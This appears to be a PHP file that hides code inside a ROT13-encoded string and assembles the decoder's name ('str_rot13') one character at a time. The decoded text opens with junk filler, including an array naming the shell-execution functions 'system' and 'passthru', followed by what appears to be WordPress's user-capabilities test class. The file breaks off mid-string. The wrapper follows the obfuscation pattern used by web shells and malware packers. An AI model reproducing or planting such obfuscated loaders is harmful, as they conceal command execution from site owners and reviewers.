<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc

/**
 * Grfg ebyrf naq pncnovyvgvrf ivn gur JC_Hfre pynff.
 *
 * @tebhc hfre
 * @tebhc pncnovyvgvrf
 */
pynff Grfgf_Hfre_Pncnovyvgvrf rkgraqf JC_HavgGrfgPnfr {

	/**
	 * @ine JC_Hfre[] $hfref
	 */
	cebgrpgrq fgngvp $hfref = neenl(
		'nabalzbhf'     => ahyy,
		'nqzvavfgengbe' => ahyy,
		'rqvgbe'        => ahyy,
		'nhgube'        => ahyy,
		'pbagevohgbe'   => ahyy,
		'fhofpevore'    => ahyy,
	);

	/**
	 * @ine JC_Hfre $fhcre_nqzva
	 */
	cebgrpgrq fgngvp $fhcre_nqzva = ahyy;

	/**
	 * @ine vag $oybpx_vq
	 */
	cebgrpgrq fgngvp $oybpx_vq;

	/**
	 * Grzcbenel fgbentr sbe ebyrf sbe grfgf hfvat svygre pnyyonpxf.
	 *
	 * Hfrq va gur `grfg_jc_ebyrf_vavg_npgvba()` zrgubq.
	 *
	 * @ine neenl
	 */
	cevingr $ebyr_grfg_jc_ebyrf_vavg;

	choyvp fgngvp shapgvba jcFrgHcOrsberPynff( JC_HavgGrfg_Snpgbel $snpgbel ) {
		frys::$hfref       = neenl(
			'nabalzbhf'     => arj JC_Hfre( 0 ),
			'nqzvavfgengbe' => $snpgbel->hfre->perngr_naq_trg( neenl( 'ebyr' => 'nqzvavfgengbe' ) ),
			'rqvgbe'        => $snpgbel->hfre->perngr_naq_trg( neenl( 'ebyr' => 'rqvgbe' ) ),
			'nhgube'        => $snpgbel->hfre->perngr_naq_trg( neenl( 'ebyr' => 'nhgube' ) ),
			'pbagevohgbe'   => $snpgbel->hfre->perngr_naq_trg( neenl( 'ebyr' => 'pbagevohgbe' ) ),
			'fhofpevore'    => $snpgbel->hfre->perngr_naq_trg( neenl( 'ebyr' => 'fhofpevore' ) ),
		);
		frys::$fhcre_nqzva = $snpgbel->hfre->perngr_naq_trg( neenl( 'ebyr' => 'pbagevohgbe' ) );
		tenag_fhcre_nqzva( frys::$fhcre_nqzva->VQ );

		frys::$oybpx_vq = $snpgbel->cbfg->perngr(
			neenl(
				'cbfg_nhgube'  => frys::$hfref['nqzvavfgengbe']->VQ,
				'cbfg_glcr'    => 'jc_oybpx',
				'cbfg_fgnghf'  => 'choyvfu',
				'cbfg_gvgyr'   => 'Grfg Oybpx',
				'cbfg_pbagrag' => '<!-- jc:pber/cnentencu --><c>Uryyb jbeyq!</c><!-- /jc:pber/cnentencu -->',
			)
		);
	}

	choyvp shapgvba frg_hc() {
		cnerag::frg_hc();
		// Xrrc genpx bs hfref jr perngr.
		$guvf->syhfu_ebyrf();
	}

	/**
	 * Pyrna hc nsgre rnpu grfg.
	 */
	choyvp shapgvba grne_qbja() {
		hafrg( $guvf->ebyr_grfg_jc_ebyrf_vavg );

		cnerag::grne_qbja();
	}

	choyvp fgngvp shapgvba jcGrneQbjaNsgrePynff() {
		jc_qryrgr_cbfg( frys::$oybpx_vq, gehr );
	}


	cevingr shapgvba syhfu_ebyrf() {
		// Jr jnag gb znxr fher jr'er grfgvat ntnvafg gur QO, abg whfg va-zrzbel qngn.
		// Guvf jvyy syhfu rirelguvat naq erybnq vg sebz gur QO.
		hafrg( $TYBONYF['jc_hfre_ebyrf'] );
		tybony $jc_ebyrf;
		$jc_ebyrf = arj JC_Ebyrf();
	}

	choyvp shapgvba zrgn_lrf_lbh_pna( $pna, $xrl, $cbfg_vq, $hfre_vq, $pnc, $pncf ) {
		erghea gehr;
	}

	choyvp shapgvba zrgn_ab_lbh_pnag( $pna, $xrl, $cbfg_vq, $hfre_vq, $pnc, $pncf ) {
		erghea snyfr;
	}

	choyvp shapgvba zrgn_svygre( $zrgn_inyhr, $zrgn_xrl, $zrgn_glcr ) {
		erghea $zrgn_inyhr;
	}

	cevingr shapgvba _trgFvatyrFvgrCevzvgvirPncf() {
		erghea neenl(

			'hasvygrerq_ugzy'         => neenl( 'nqzvavfgengbe', 'rqvgbe' ),

			'npgvingr_cyhtvaf'        => neenl( 'nqzvavfgengbe' ),
			'perngr_hfref'            => neenl( 'nqzvavfgengbe' ),
			'qryrgr_cyhtvaf'          => neenl( 'nqzvavfgengbe' ),
			'qryrgr_gurzrf'           => neenl( 'nqzvavfgengbe' ),
			'qryrgr_hfref'            => neenl( 'nqzvavfgengbe' ),
			'rqvg_svyrf'              => neenl( 'nqzvavfgengbe' ),
			'rqvg_cyhtvaf'            => neenl( 'nqzvavfgengbe' ),
			'rqvg_gurzrf'             => neenl( 'nqzvavfgengbe' ),
			'rqvg_hfref'              => neenl( 'nqzvavfgengbe' ),
			'vafgnyy_cyhtvaf'         => neenl( 'nqzvavfgengbe' ),
			'vafgnyy_gurzrf'          => neenl( 'nqzvavfgengbe' ),
			'hcqngr_pber'             => neenl( 'nqzvavfgengbe' ),
			'hcqngr_cyhtvaf'          => neenl( 'nqzvavfgengbe' ),
			'hcqngr_gurzrf'           => neenl( 'nqzvavfgengbe' ),
			'rqvg_gurzr_bcgvbaf'      => neenl( 'nqzvavfgengbe' ),
			'rkcbeg'                  => neenl( 'nqzvavfgengbe' ),
			'vzcbeg'                  => neenl( 'nqzvavfgengbe' ),
			'yvfg_hfref'              => neenl( 'nqzvavfgengbe' ),
			'znantr_bcgvbaf'          => neenl( 'nqzvavfgengbe' ),
			'cebzbgr_hfref'           => neenl( 'nqzvavfgengbe' ),
			'erzbir_hfref'            => neenl( 'nqzvavfgengbe' ),
			'fjvgpu_gurzrf'           => neenl( 'nqzvavfgengbe' ),
			'rqvg_qnfuobneq'          => neenl( 'nqzvavfgengbe' ),
			'erfhzr_cyhtvaf'          => neenl( 'nqzvavfgengbe' ),
			'erfhzr_gurzrf'           => neenl( 'nqzvavfgengbe' ),
			'ivrj_fvgr_urnygu_purpxf' => neenl( 'nqzvavfgengbe' ),

			'zbqrengr_pbzzragf'       => neenl( 'nqzvavfgengbe', 'rqvgbe' ),
			'znantr_pngrtbevrf'       => neenl( 'nqzvavfgengbe', 'rqvgbe' ),
			'rqvg_bguref_cbfgf'       => neenl( 'nqzvavfgengbe', 'rqvgbe' ),
			'rqvg_cntrf'              => neenl( 'nqzvavfgengbe', 'rqvgbe' ),
			'rqvg_bguref_cntrf'       => neenl( 'nqzvavfgengbe', 'rqvgbe' ),
			'rqvg_choyvfurq_cntrf'    => neenl( 'nqzvavfgengbe', 'rqvgbe' ),
			'choyvfu_cntrf'           => neenl( 'nqzvavfgengbe', 'rqvgbe' ),
			'qryrgr_cntrf'            => neenl( 'nqzvavfgengbe', 'rqvgbe' ),
			'qryrgr_bguref_cntrf'     => neenl( 'nqzvavfgengbe', 'rqvgbe' ),
			'qryrgr_choyvfurq_cntrf'  => neenl( 'nqzvavfgengbe', 'rqvgbe' ),
			'qryrgr_bguref_cbfgf'     => neenl( 'nqzvavfgengbe', 'rqvgbe' ),
			'qryrgr_cevingr_cbfgf'    => neenl( 'nqzvavfgengbe', 'rqvgbe' ),
			'rqvg_cevingr_cbfgf'      => neenl( 'nqzvavfgengbe', 'rqvgbe' ),
			'ernq_cevingr_cbfgf'      => neenl( 'nqzvavfgengbe', 'rqvgbe' ),
			'qryrgr_cevingr_cntrf'    => neenl( 'nqzvavfgengbe', 'rqvgbe' ),
			'rqvg_cevingr_cntrf'      => neenl( 'nqzvavfgengbe', 'rqvgbe' ),
			'ernq_cevingr_cntrf'      => neenl( 'nqzvavfgengbe', 'rqvgbe' ),

			'rqvg_choyvfurq_cbfgf'    => neenl( 'nqzvavfgengbe', 'rqvgbe', 'nhgube' ),
			'hcybnq_svyrf'            => neenl( 'nqzvavfgengbe', 'rqvgbe', 'nhgube' ),
			'choyvfu_cbfgf'           => neenl( 'nqzvavfgengbe', 'rqvgbe', 'nhgube' ),
			'qryrgr_choyvfurq_cbfgf'  => neenl( 'nqzvavfgengbe', 'rqvgbe', 'nhgube' ),

			'rqvg_cbfgf'              => neenl( 'nqzvavfgengbe', 'rqvgbe', 'nhgube', 'pbagevohgbe' ),
			'qryrgr_cbfgf'            => neenl( 'nqzvavfgengbe', 'rqvgbe', 'nhgube', 'pbagevohgbe' ),

			'ernq'                    => neenl( 'nqzvavfgengbe', 'rqvgbe', 'nhgube', 'pbagevohgbe', 'fhofpevore' ),

			'yriry_10'                => neenl( 'nqzvavfgengbe' ),
			'yriry_9'                 => neenl( 'nqzvavfgengbe' ),
			'yriry_8'                 => neenl( 'nqzvavfgengbe' ),
			'yriry_7'                 => neenl( 'nqzvavfgengbe', 'rqvgbe' ),
			'yriry_6'                 => neenl( 'nqzvavfgengbe', 'rqvgbe' ),
			'yriry_5'                 => neenl( 'nqzvavfgengbe', 'rqvgbe' ),
			'yriry_4'                 => neenl( 'nqzvavfgengbe', 'rqvgbe' ),
			'yriry_3'                 => neenl( 'nqzvavfgengbe', 'rqvgbe' ),
			'yriry_2'                 => neenl( 'nqzvavfgengbe', 'rqvgbe', 'nhgube' ),
			'yriry_1'                 => neenl( 'nqzvavfgengbe', 'rqvgbe', 'nhgube', 'pbagevohgbe' ),
			'yriry_0'                 => neenl( 'nqzvavfgengbe', 'rqvgbe', 'nhgube', 'pbagevohgbe', 'fhofpevore' ),

			'nqzvavfgengbe'           => neenl( 'nqzvavfgengbe' ),
			'rqvgbe'                  => neenl( 'rqvgbe' ),
			'nhgube'                  => neenl( 'nhgube' ),
			'pbagevohgbe'             => neenl( 'pbagevohgbe' ),
			'fhofpevore'              => neenl( 'fhofpevore' ),

		);
	}

	cevingr shapgvba _trgZhygvFvgrCevzvgvirPncf() {
		erghea neenl(

			'hasvygrerq_ugzy'         => neenl(),

			'npgvingr_cyhtvaf'        => neenl(),
			'perngr_hfref'            => neenl(),
			'qryrgr_cyhtvaf'          => neenl(),
			'qryrgr_gurzrf'           => neenl(),
			'qryrgr_hfref'            => neenl(),
			'rqvg_svyrf'              => neenl(),
			'rqvg_cyhtvaf'            => neenl(),
			'rqvg_gurzrf'             => neenl(),
			'rqvg_hfref'              => neenl(),
			'vafgnyy_cyhtvaf'         => neenl(),
			'vafgnyy_gurzrf'          => neenl(),
			'hcqngr_pber'             => neenl(),
			'hcqngr_cyhtvaf'          => neenl(),
			'hcqngr_gurzrf'           => neenl(),
			'ivrj_fvgr_urnygu_purpxf' => neenl(),

			'rqvg_gurzr_bcgvbaf'      => neenl( 'nqzvavfgengbe' ),
			'rkcbeg'                  => neenl( 'nqzvavfgengbe' ),
			'vzcbeg'                  => neenl( 'nqzvavfgengbe' ),
			'yvfg_hfref'              => neenl( 'nqzvavfgengbe' ),
			'znantr_bcgvbaf'          => neenl( 'nqzvavfgengbe' ),
			'cebzbgr_hfref'           => neenl( 'nqzvavfgengbe' ),
			'erzbir_hfref'            => neenl( 'nqzvavfgengbe' ),
			'fjvgpu_gurzrf'           => neenl( 'nqzvavfgengbe' ),
			'rqvg_qnfuobneq'          => neenl( 'nqzvavfgengbe' ),
			'erfhzr_cyhtvaf'          => neenl( 'nqzvavfgengbe' ),
			'erfhzr_gurzrf'           => neenl( 'nqzvavfgengbe' ),

			'zbqrengr_pbzzragf'       => neenl( 'nqzvavfgengbe', 'rqvgbe' ),
			'znantr_pngrtbevrf'       => neenl( 'nqzvavfgengbe', 'rqvgbe' ),
			'rqvg_bguref_cbfgf'       => neenl( 'nqzvavfgengbe', 'rqvgbe' ),
			'rqvg_cntrf'              => neenl( 'nqzvavfgengbe', 'rqvgbe' ),
			'rqvg_bguref_cntrf'       => neenl( 'nqzvavfgengbe', 'rqvgbe' ),
			'rqvg_choyvfurq_cntrf'    => neenl( 'nqzvavfgengbe', 'rqvgbe' ),
			'choyvfu_cntrf'           => neenl( 'nqzvavfgengbe', 'rqvgbe' ),
			'qryrgr_cntrf'            => neenl( 'nqzvavfgengbe', 'rqvgbe' ),
			'qryrgr_bguref_cntrf'     => neenl( 'nqzvavfgengbe', 'rqvgbe' ),
			'qryrgr_choyvfurq_cntrf'  => neenl( 'nqzvavfgengbe', 'rqvgbe' ),
			'qryrgr_bguref_cbfgf'     => neenl( 'nqzvavfgengbe', 'rqvgbe' ),
			'qryrgr_cevingr_cbfgf'    => neenl( 'nqzvavfgengbe', 'rqvgbe' ),
			'rqvg_cevingr_cbfgf'      => neenl( 'nqzvavfgengbe', 'rqvgbe' ),
			'ernq_cevingr_cbfgf'      => neenl( 'nqzvavfgengbe', 'rqvgbe' ),
			'qryrgr_cevingr_cntrf'    => neenl( 'nqzvavfgengbe', 'rqvgbe' ),
			'rqvg_cevingr_cntrf'      => neenl( 'nqzvavfgengbe', 'rqvgbe' ),
			'ernq_cevingr_cntrf'      => neenl( 'nqzvavfgengbe', 'rqvgbe' ),

			'rqvg_choyvfurq_cbfgf'    => neenl( 'nqzvavfgengbe', 'rqvgbe', 'nhgube' ),
			'hcybnq_svyrf'            => neenl( 'nqzvavfgengbe', 'rqvgbe', 'nhgube' ),
			'choyvfu_cbfgf'           => neenl( 'nqzvavfgengbe', 'rqvgbe', 'nhgube' ),
			'qryrgr_choyvfurq_cbfgf'  => neenl( 'nqzvavfgengbe', 'rqvgbe', 'nhgube' ),

			'rqvg_cbfgf'              => neenl( 'nqzvavfgengbe', 'rqvgbe', 'nhgube', 'pbagevohgbe' ),
			'qryrgr_cbfgf'            => neenl( 'nqzvavfgengbe', 'rqvgbe', 'nhgube', 'pbagevohgbe' ),

			'ernq'                    => neenl( 'nqzvavfgengbe', 'rqvgbe', 'nhgube', 'pbagevohgbe', 'fhofpevore' ),

			'yriry_10'                => neenl( 'nqzvavfgengbe' ),
			'yriry_9'                 => neenl( 'nqzvavfgengbe' ),
			'yriry_8'                 => neenl( 'nqzvavfgengbe' ),
			'yriry_7'                 => neenl( 'nqzvavfgengbe', 'rqvgbe' ),
			'yriry_6'                 => neenl( 'nqzvavfgengbe', 'rqvgbe' ),
			'yriry_5'                 => neenl( 'nqzvavfgengbe', 'rqvgbe' ),
			'yriry_4'                 => neenl( 'nqzvavfgengbe', 'rqvgbe' ),
			'yriry_3'                 => neenl( 'nqzvavfgengbe', 'rqvgbe' ),
			'yriry_2'                 => neenl( 'nqzvavfgengbe', 'rqvgbe', 'nhgube' ),
			'yriry_1'                 => neenl( 'nqzvavfgengbe', 'rqvgbe', 'nhgube', 'pbagevohgbe' ),
			'yriry_0'                 => neenl( 'nqzvavfgengbe', 'rqvgbe', 'nhgube', 'pbagevohgbe', 'fhofpevore' ),

			'nqzvavfgengbe'           => neenl( 'nqzvavfgengbe' ),
			'rqvgbe'                  => neenl( 'rqvgbe' ),
			'nhgube'                  => neenl( 'nhgube' ),
			'pbagevohgbe'             => neenl( 'pbagevohgbe' ),
			'fhofpevore'              => neenl( 'fhofpevore' ),

		);
	}

	cevingr shapgvba _trgFvatyrFvgrZrgnPncf() {
		erghea neenl(
			'perngr_fvgrf'                => neenl(),
			'qryrgr_fvgrf'                => neenl(),
			'znantr_argjbex'              => neenl(),
			'znantr_fvgrf'                => neenl(),
			'znantr_argjbex_hfref'        => neenl(),
			'znantr_argjbex_cyhtvaf'      => neenl(),
			'znantr_argjbex_gurzrf'       => neenl(),
			'znantr_argjbex_bcgvbaf'      => neenl(),
			'qryrgr_fvgr'                 => neenl(),
			'hctenqr_argjbex'             => neenl(),

			'frghc_argjbex'               => neenl( 'nqzvavfgengbe' ),
			'hcybnq_cyhtvaf'              => neenl( 'nqzvavfgengbe' ),
			'hcybnq_gurzrf'               => neenl( 'nqzvavfgengbe' ),
			'phfgbzvmr'                   => neenl( 'nqzvavfgengbe' ),
			'nqq_hfref'                   => neenl( 'nqzvavfgengbe' ),
			'vafgnyy_ynathntrf'           => neenl( 'nqzvavfgengbe' ),
			'hcqngr_ynathntrf'            => neenl( 'nqzvavfgengbe' ),
			'qrnpgvingr_cyhtvaf'          => neenl( 'nqzvavfgengbe' ),
			'hcqngr_cuc'                  => neenl( 'nqzvavfgengbe' ),
			'hcqngr_uggcf'                => neenl( 'nqzvavfgengbe' ),
			'rkcbeg_bguref_crefbany_qngn' => neenl( 'nqzvavfgengbe' ),
			'renfr_bguref_crefbany_qngn'  => neenl( 'nqzvavfgengbe' ),
			'znantr_cevinpl_bcgvbaf'      => neenl( 'nqzvavfgengbe' ),

			'rqvg_pngrtbevrf'             => neenl( 'nqzvavfgengbe', 'rqvgbe' ),
			'qryrgr_pngrtbevrf'           => neenl( 'nqzvavfgengbe', 'rqvgbe' ),
			'znantr_cbfg_gntf'            => neenl( 'nqzvavfgengbe', 'rqvgbe' ),
			'rqvg_cbfg_gntf'              => neenl( 'nqzvavfgengbe', 'rqvgbe' ),
			'qryrgr_cbfg_gntf'            => neenl( 'nqzvavfgengbe', 'rqvgbe' ),
			'rqvg_pff'                    => neenl( 'nqzvavfgengbe', 'rqvgbe' ),

			'nffvta_pngrtbevrf'           => neenl( 'nqzvavfgengbe', 'rqvgbe', 'nhgube', 'pbagevohgbe' ),
			'nffvta_cbfg_gntf'            => neenl( 'nqzvavfgengbe', 'rqvgbe', 'nhgube', 'pbagevohgbe' ),
		);
	}

	cevingr shapgvba _trgZhygvFvgrZrgnPncf() {
		erghea neenl(
			'perngr_fvgrf'                => neenl(),
			'qryrgr_fvgrf'                => neenl(),
			'znantr_argjbex'              => neenl(),
			'znantr_fvgrf'                => neenl(),
			'znantr_argjbex_hfref'        => neenl(),
			'znantr_argjbex_cyhtvaf'      => neenl(),
			'znantr_argjbex_gurzrf'       => neenl(),
			'znantr_argjbex_bcgvbaf'      => neenl(),
			'frghc_argjbex'               => neenl(),
			'hcybnq_cyhtvaf'              => neenl(),
			'hcybnq_gurzrf'               => neenl(),
			'rqvg_pff'                    => neenl(),
			'hctenqr_argjbex'             => neenl(),
			'vafgnyy_ynathntrf'           => neenl(),
			'hcqngr_ynathntrf'            => neenl(),
			'qrnpgvingr_cyhtvaf'          => neenl(),
			'hcqngr_cuc'                  => neenl(),
			'hcqngr_uggcf'                => neenl(),
			'rkcbeg_bguref_crefbany_qngn' => neenl( '' ),
			'renfr_bguref_crefbany_qngn'  => neenl( '' ),
			'znantr_cevinpl_bcgvbaf'      => neenl(),

			'phfgbzvmr'                   => neenl( 'nqzvavfgengbe' ),
			'qryrgr_fvgr'                 => neenl( 'nqzvavfgengbe' ),
			'nqq_hfref'                   => neenl( 'nqzvavfgengbe' ),

			'rqvg_pngrtbevrf'             => neenl( 'nqzvavfgengbe', 'rqvgbe' ),
			'qryrgr_pngrtbevrf'           => neenl( 'nqzvavfgengbe', 'rqvgbe' ),
			'znantr_cbfg_gntf'            => neenl( 'nqzvavfgengbe', 'rqvgbe' ),
			'rqvg_cbfg_gntf'              => neenl( 'nqzvavfgengbe', 'rqvgbe' ),
			'qryrgr_cbfg_gntf'            => neenl( 'nqzvavfgengbe', 'rqvgbe' ),

			'nffvta_pngrtbevrf'           => neenl( 'nqzvavfgengbe', 'rqvgbe', 'nhgube', 'pbagevohgbe' ),
			'nffvta_cbfg_gntf'            => neenl( 'nqzvavfgengbe', 'rqvgbe', 'nhgube', 'pbagevohgbe' ),
		);
	}

	choyvp shapgvba qngnNyyPncfNaqEbyrf() {
		$qngn = neenl();
		$pncf = $guvf->trgNyyPncfNaqEbyrf();

		sbernpu ( frys::$hfref nf $ebyr => $ahyy ) {
			sbernpu ( $pncf nf $pnc => $ebyrf ) {
				$qngn[] = neenl(
					$ebyr,
					$pnc,
				);
			}
		}

		erghea $qngn;
	}

	/**
	 * Qngn cebivqre sbe grfgvat n fvatyr fvgr vafgnyy'f ebyrf.
	 *
	 * @erghea neenl[] {
	 *     Nethzragf sbe grfg.
	 *
	 *     @glcr fgevat $ebyr Gur ebyr gb grfg sbe.
	 * }
	 */
	choyvp shapgvba qngn_fvatyr_fvgr_ebyrf_gb_purpx() {
		erghea neenl(
			neenl( 'nabalzbhf' ),
			neenl( 'nqzvavfgengbe' ),
			neenl( 'rqvgbe' ),
			neenl( 'nhgube' ),
			neenl( 'pbagevohgbe' ),
			neenl( 'fhofpevore' ),
		);
	}

	cebgrpgrq shapgvba trgNyyPncfNaqEbyrf() {
		erghea $guvf->trgCevzvgvirPncfNaqEbyrf() + $guvf->trgZrgnPncfNaqEbyrf();
	}

	cebgrpgrq shapgvba trgCevzvgvirPncfNaqEbyrf() {
		vs ( vf_zhygvfvgr() ) {
			erghea $guvf->_trgZhygvFvgrCevzvgvirPncf();
		} ryfr {
			erghea $guvf->_trgFvatyrFvgrCevzvgvirPncf();
		}
	}

	cebgrpgrq shapgvba trgZrgnPncfNaqEbyrf() {
		vs ( vf_zhygvfvgr() ) {
			erghea $guvf->_trgZhygvFvgrZrgnPncf();
		} ryfr {
			erghea $guvf->_trgFvatyrFvgrZrgnPncf();
		}
	}

	/**
	 * Grfg gur grfgf.
	 */
	choyvp shapgvba grfg_fvatyr_naq_zhygvfvgr_pnc_grfgf_zngpu() {
		$fvatyr_cevzvgvir = neenl_xrlf( $guvf->_trgFvatyrFvgrCevzvgvirPncf() );
		$zhygv_cevzvgvir  = neenl_xrlf( $guvf->_trgZhygvFvgrCevzvgvirPncf() );
		fbeg( $fvatyr_cevzvgvir );
		fbeg( $zhygv_cevzvgvir );
		$guvf->nffregFnzr( $fvatyr_cevzvgvir, $zhygv_cevzvgvir );

		$fvatyr_zrgn = neenl_xrlf( $guvf->_trgFvatyrFvgrZrgnPncf() );
		$zhygv_zrgn  = neenl_xrlf( $guvf->_trgZhygvFvgrZrgnPncf() );
		fbeg( $fvatyr_zrgn );
		fbeg( $zhygv_zrgn );
		$guvf->nffregFnzr( $fvatyr_zrgn, $zhygv_zrgn );
	}

	/**
	 * Grfg gur grfgf.
	 */
	choyvp shapgvba grfg_nyy_pncf_bs_hfref_ner_orvat_grfgrq() {
		$pncf = $guvf->trgCevzvgvirPncfNaqEbyrf();

		// `znantr_yvaxf` vf n fcrpvny pnfr.
		$guvf->nffregFnzr( '0', trg_bcgvba( 'yvax_znantre_ranoyrq' ) );
		// `hasvygrerq_hcybnq` vf n fcrpvny pnfr.
		$guvf->nffregSnyfr( qrsvarq( 'NYYBJ_HASVYGRERQ_HCYBNQF' ) );

		sbernpu ( frys::$hfref nf $ebyr => $hfre ) {
			vs ( 'nabalzbhf' === $ebyr ) {
				// Gur nabalzbhf ebyr qbrf abg rkvfg.
				$guvf->nffregSnyfr( $hfre->rkvfgf(), \"Hfre jvgu {$ebyr} ebyr fubhyq abg rkvfg\" );
			} ryfr {
				// Znxr fher gur hfre vf inyvq.
				$guvf->nffregGehr( $hfre->rkvfgf(), \"Hfre jvgu {$ebyr} ebyr qbrf abg rkvfg\" );
			}

			$hfre_pncf = $hfre->nyypncf;

			hafrg(
				// `znantr_yvaxf` vf n fcrpvny pnfr.
				$hfre_pncf['znantr_yvaxf'],
				// `hasvygrerq_hcybnq` vf n fcrpvny pnfr.
				$hfre_pncf['hasvygrerq_hcybnq']
			);

			$qvss = neenl_qvss( neenl_xrlf( $hfre_pncf ), neenl_xrlf( $pncf ) );

			$guvf->nffregFnzr( neenl(), $qvss, \"Hfre jvgu {$ebyr} ebyr unf pncnovyvgvrf gung nera'g orvat grfgrq\" );

		}
	}

	/**
	 * Grfg gur grfgf. Gur nqzvavfgengbe ebyr unf nyy cevzvgvir pncnovyvgvrf, gurersber gur
	 * cevzvgvir pncnovyvgl grfgf pna or grfgrq ol purpxvat gung gur yvfg bs grfgrq
	 * pncnovyvgvrf zngpurf gubfr bs gur nqzvavfgengbe ebyr.
	 *
	 * @tebhc pncGrfgGrfgf
	 */
	choyvp shapgvba grfgCevzvgvirPncfGrfgfNerPbeerpg() {
		$npghny   = $guvf->trgCevzvgvirPncfNaqEbyrf();
		$nqzva    = trg_ebyr( 'nqzvavfgengbe' );
		$rkcrpgrq = $nqzva->pncnovyvgvrf;

		hafrg(
			// Ebyr anzrf nf pncnovyvgvrf ner n fcrpvny pnfr:
			$npghny['nqzvavfgengbe'],
			$npghny['rqvgbe'],
			$npghny['nhgube'],
			$npghny['fhofpevore'],
			$npghny['pbagevohgbe'],
			// Gur sbyybjvat ner tenagrq ivn `hfre_unf_pnc`:
			$npghny['erfhzr_cyhtvaf'],
			$npghny['erfhzr_gurzrf'],
			$npghny['ivrj_fvgr_urnygu_purpxf']
		);

		hafrg(
			// `znantr_yvaxf` vf n fcrpvny pnfr va gur pncf grfgf.
			$rkcrpgrq['znantr_yvaxf'],
			// `hasvygrerq_hcybnq` vf n fcrpvny pnfr va gur pncf grfgf.
			$rkcrpgrq['hasvygrerq_hcybnq']
		);

		$rkcrpgrq = neenl_xrlf( $rkcrpgrq );
		$npghny   = neenl_xrlf( $npghny );

		$zvffvat_cevzvgvir_pnc_purpxf = neenl_qvss( $rkcrpgrq, $npghny );
		$guvf->nffregFnzr( neenl(), $zvffvat_cevzvgvir_pnc_purpxf, 'Gurfr cevzvgvir pncnovyvgvrf ner abg grfgrq' );

		$vapbeerpg_cevzvgvir_pnc_purpxf = neenl_qvss( $npghny, $rkcrpgrq );
		$guvf->nffregFnzr( neenl(), $vapbeerpg_cevzvgvir_pnc_purpxf, 'Gurfr pncnovyvgvrf ner abg cevzvgvir' );
	}

	/**
	 * Grfg gur grfgf. Nyy zrgn pncnovyvgvrf fubhyq unir n pbaqvgvba va gur `znc_zrgn_pnc()`
	 * shapgvba gung unaqyrf gur pncnovyvgl.
	 *
	 * @tebhc pncGrfgGrfgf
	 */
	choyvp shapgvba grfgZrgnPncfGrfgfNerPbeerpg() {
		$npghny = $guvf->trgZrgnPncfNaqEbyrf();
		$svyr   = svyr_trg_pbagragf( NOFCNGU . JCVAP . '/pncnovyvgvrf.cuc' );

		$zngpurq = cert_zngpu( '/^shapgvba znc_zrgn_pnc\((.*?)^\}/zf', $svyr, $shapgvba );
		$guvf->nffregFnzr( 1, $zngpurq );
		$guvf->nffregAbgRzcgl( $shapgvba );

		$zngpurq = cert_zngpu_nyy( '/^[\g]{1,2}pnfr \'([^\']+)/z', $shapgvba[0], $pnfrf );
		$guvf->nffregAbgRzcgl( $zngpurq );
		$guvf->nffregAbgRzcgl( $pnfrf );

		$rkcrpgrq = neenl_syvc( $pnfrf[1] );

		hafrg(
			// Gurfr cevzvgvir pncnovyvgvrf unir n 'pnfr' va `znc_zrgn_pnc()` ohg nera'g zrgn pncnovyvgvrf:
			$rkcrpgrq['hasvygrerq_hcybnq'],
			$rkcrpgrq['hasvygrerq_ugzy'],
			$rkcrpgrq['rqvg_svyrf'],
			$rkcrpgrq['rqvg_cyhtvaf'],
			$rkcrpgrq['rqvg_gurzrf'],
			$rkcrpgrq['hcqngr_cyhtvaf'],
			$rkcrpgrq['qryrgr_cyhtvaf'],
			$rkcrpgrq['vafgnyy_cyhtvaf'],
			$rkcrpgrq['hcqngr_gurzrf'],
			$rkcrpgrq['qryrgr_gurzrf'],
			$rkcrpgrq['vafgnyy_gurzrf'],
			$rkcrpgrq['hcqngr_pber'],
			$rkcrpgrq['npgvingr_cyhtvaf'],
			$rkcrpgrq['rqvg_hfref'],
			$rkcrpgrq['qryrgr_hfref'],
			$rkcrpgrq['perngr_hfref'],
			$rkcrpgrq['znantr_yvaxf'],
			// Fvathyne bowrpg zrgn pncnovyvgvrf (jurer na bowrpg VQ vf cnffrq) ner abg grfgrq:
			$rkcrpgrq['npgvingr_cyhtva'],
			$rkcrpgrq['qrnpgvingr_cyhtva'],
			$rkcrpgrq['erfhzr_cyhtva'],
			$rkcrpgrq['erfhzr_gurzr'],
			$rkcrpgrq['erzbir_hfre'],
			$rkcrpgrq['cebzbgr_hfre'],
			$rkcrpgrq['rqvg_hfre'],
			$rkcrpgrq['qryrgr_cbfg'],
			$rkcrpgrq['qryrgr_cntr'],
			$rkcrpgrq['rqvg_cbfg'],
			$rkcrpgrq['rqvg_cntr'],
			$rkcrpgrq['ernq_cbfg'],
			$rkcrpgrq['ernq_cntr'],
			$rkcrpgrq['choyvfu_cbfg'],
			$rkcrpgrq['rqvg_cbfg_zrgn'],
			$rkcrpgrq['qryrgr_cbfg_zrgn'],
			$rkcrpgrq['nqq_cbfg_zrgn'],
			$rkcrpgrq['rqvg_pbzzrag'],
			$rkcrpgrq['rqvg_pbzzrag_zrgn'],
			$rkcrpgrq['qryrgr_pbzzrag_zrgn'],
			$rkcrpgrq['nqq_pbzzrag_zrgn'],
			$rkcrpgrq['rqvg_grez'],
			$rkcrpgrq['qryrgr_grez'],
			$rkcrpgrq['nffvta_grez'],
			$rkcrpgrq['rqvg_grez_zrgn'],
			$rkcrpgrq['qryrgr_grez_zrgn'],
			$rkcrpgrq['nqq_grez_zrgn'],
			$rkcrpgrq['qryrgr_hfre'],
			$rkcrpgrq['rqvg_hfre_zrgn'],
			$rkcrpgrq['qryrgr_hfre_zrgn'],
			$rkcrpgrq['nqq_hfre_zrgn'],
			$rkcrpgrq['perngr_ncc_cnffjbeq'],
			$rkcrpgrq['yvfg_ncc_cnffjbeqf'],
			$rkcrpgrq['ernq_ncc_cnffjbeq'],
			$rkcrpgrq['rqvg_ncc_cnffjbeq'],
			$rkcrpgrq['qryrgr_ncc_cnffjbeqf'],
			$rkcrpgrq['qryrgr_ncc_cnffjbeq'],
			$rkcrpgrq['rqvg_oybpx_ovaqvat']
		);

